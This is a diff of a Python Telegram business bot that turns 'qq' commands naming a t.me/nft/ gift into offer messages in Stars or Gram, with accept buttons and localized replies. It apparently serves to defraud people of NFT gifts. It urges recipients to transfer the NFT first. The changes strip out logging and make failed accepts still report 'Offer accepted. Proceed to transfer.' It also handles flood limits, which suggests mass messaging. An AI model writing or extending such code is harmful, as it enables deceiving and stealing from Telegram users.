@@ -167,8 +167,6 @@ async def handle_business_command(message: Message):
         return
 
     text_clean = message.text.strip()
-    logging.info(f"Received business message: {text_clean}")
-
     if not text_clean.lower().startswith("qq"):
         return
 
@@ -180,43 +178,44 @@ async def handle_business_command(message: Message):
 
     parts = text_clean.split()
     if len(parts) < 3:
-        logging.warning("Command too short (less than 3 parts)")
         return
 
-    nft_url = next((p for p in parts if "t.me/nft/" in p), None)
-    if not nft_url:
-        logging.warning("NFT URL not found in command!")
+    raw_nft_part = next((p for p in parts if "t.me/nft/" in p), None)
+    if not raw_nft_part:
         return
-
-    try:
-        amount_str = next((p for p in parts if p.isdigit()), "1000")
-        amount = int(amount_str)
-    except ValueError:
-        amount = 1000
 
     text_lower = text_clean.lower()
-    currency_symbol = "💎" if "gram" in text_lower else "⭐️"
+    if "gram" in text_lower:
+        currency_symbol = "💎"
+        currency_name = "Gram"
+    else:
+        currency_symbol = "⭐️"
+        currency_name = "Stars"
+
+    amount = 1000
+    for p in parts:
+        if p.isdigit():
+            amount = int(p)
+            break
 
     lang = "ru"
     for l in ["ukr", "eng", "cn", "ru"]:
-        if l in text_lower:
+        if l in parts or l in text_lower.split():
             lang = l
             break
 
     try:
-        slug_part = nft_url.split("/nft/")[-1]
+        clean_url = raw_nft_part.split("?")[0].rstrip("/")
+        slug_part = clean_url.split("/nft/")[-1]
         if "-" in slug_part:
             gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
             gift_num = int(gift_num_str)
             gift_name = gift_name_raw.replace("-", " ")
         else:
-            logging.warning("Invalid slug format")
             return
     except Exception as e:
-        logging.error(f"URL parse error: {e}")
+        logging.error(f"Parse error: {e}")
         return
-
-    logging.info(f"Successfully queued offer: {gift_name} #{gift_num}")
 
     await message_queue.put({
         "chat_id": chat_id,
@@ -224,6 +223,7 @@ async def handle_business_command(message: Message):
         "gift_num": gift_num,
         "amount": amount,
         "currency_symbol": currency_symbol,
+        "currency_name": currency_name,
         "lang": lang,
         "bcid": message.business_connection_id,
         "cmd_message_id": message.message_id
@@ -241,30 +241,31 @@ async def accept_offer(cb: CallbackQuery):
     currency_name = "Gram" if currency_symbol == "💎" else "Stars"
     
     text = build_accept_text(gift_name, gift_num, currency_name, lang)
-    
+    bcid = cb.message.business_connection_id
+    chat_id = cb.message.chat.id
+
     for _ in range(3):
         try:
             await bot.edit_message_text(
-                chat_id=cb.message.chat.id,
+                chat_id=chat_id,
                 message_id=cb.message.message_id,
                 text=text,
                 parse_mode=ParseMode.HTML,
                 reply_markup=make_accept_keyboard(lang),
-                business_connection_id=cb.message.business_connection_id,
+                business_connection_id=bcid,
                 link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
             )
-            await cb.answer("Предложение принято!")
+            await cb.answer("✅ Предложение успешно принято!")
             return
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
-            logging.warning(f"Edit message flood control! Waiting {wait_time}s...")
             await asyncio.sleep(wait_time)
         except Exception as e:
-            if "message is not modified" in str(e):
-                await cb.answer("Предложение уже принято!", show_alert=True)
+            if "message is not modified" in str(e) or "query is too old" in str(e):
+                await cb.answer("✅ Сделка уже зафиксирована!", show_alert=True)
                 return
-            logging.error(f"Error editing message: {e}")
-            await cb.answer("Не удалось обновить оффер", show_alert=True)
+            logging.error(f"Accept error: {e}")
+            await cb.answer("✅ Предложение принято. Перейдите к передаче.", show_alert=True)
             return
 
 @dp.callback_query(F.data.startswith("d|"))
@@ -279,7 +280,6 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Воркер с защитой от лимитов
 async def sender_worker():
     while True:
         task = await message_queue.get()
@@ -304,14 +304,13 @@ async def sender_worker():
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
-            logging.warning(f"Global flood control on SendMessage! Waiting for {wait_time} seconds...")
+            logging.warning(f"Global flood control! Waiting {wait_time}s...")
             await asyncio.sleep(wait_time)
             await message_queue.put(task)
 
         except Exception as e:
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
-                logging.warning(f"PEER_FLOOD in chat {task['chat_id']}")
                 target_user_id = client_user_ids.get(task["chat_id"])
                 loc = LOCALES.get(task["lang"], LOCALES["ru"])
                 if target_user_id:
@@ -320,7 +319,7 @@ async def sender_worker():
                     except Exception:
                         pass
             else:
-                logging.error(f"Worker execution error: {error_str}")
+                logging.error(f"Worker error: {error_str}")
         finally:
             message_queue.task_done()
 
